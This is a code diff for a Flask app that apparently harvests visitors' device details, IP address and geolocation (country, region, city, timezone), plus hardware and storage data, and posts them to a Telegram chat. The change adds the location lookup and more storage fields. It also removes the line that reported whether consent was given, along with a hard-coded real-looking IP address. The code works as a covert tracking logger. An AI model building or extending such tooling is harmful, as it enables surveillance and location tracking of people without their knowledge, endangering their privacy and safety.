@@ -43,8 +43,14 @@ def handle(chat_id):
     • User Agent: {data.get('user_agent')}
 
 🌐 Network Information
-   • IP Address: 152.59.147.174
+   • IP Address: {data.get('ip_address')}
    • Language: {data.get('language')}
+
+📍 Location Details
+   • Country: {data.get('country')}
+   • Region: {data.get('region')}
+   • City: {data.get('city')}
+   • Timezone: {data.get('timezone')}
 
 🖼 Display Information
    • Resolution: {data.get('screen_resolution')}   
@@ -56,9 +62,8 @@ def handle(chat_id):
 💾 Hardware & Storage
    • CPU Cores: {data.get('cpu_cores')}
    • RAM: {data.get('ram_gb')} GB
-
-Chat ID: {chat_id}
-Consent Given: {data.get('consent_given')}
+   • Storage Used: {data.get('storage_used_gb')}
+   • Storage Total: {data.get('storage_total_gb')}
 
 ━━━━━━━━━━━━━━━━
 """
@@ -66,6 +71,27 @@ Consent Given: {data.get('consent_given')}
     send_telegram_message(chat_id, message)
 
     return jsonify({"status": "sent"})
+
+
+@app.route("/get-ip")
+def get_ip():
+    try:
+        response = requests.get("https://ipwho.is/")
+        data = response.json()
+
+        if not data.get("success", True):
+            return jsonify({"error": "IP lookup failed"}), 400
+
+        return jsonify({
+            "ip_address": data.get("ip"),
+            "country": data.get("country"),
+            "region": data.get("region"),
+            "city": data.get("city"),
+            "timezone": data.get("timezone", {}).get("id"),
+        })
+
+    except Exception as e:
+        return jsonify({"error": str(e)}), 500
 
 
 if __name__ == "__main__":
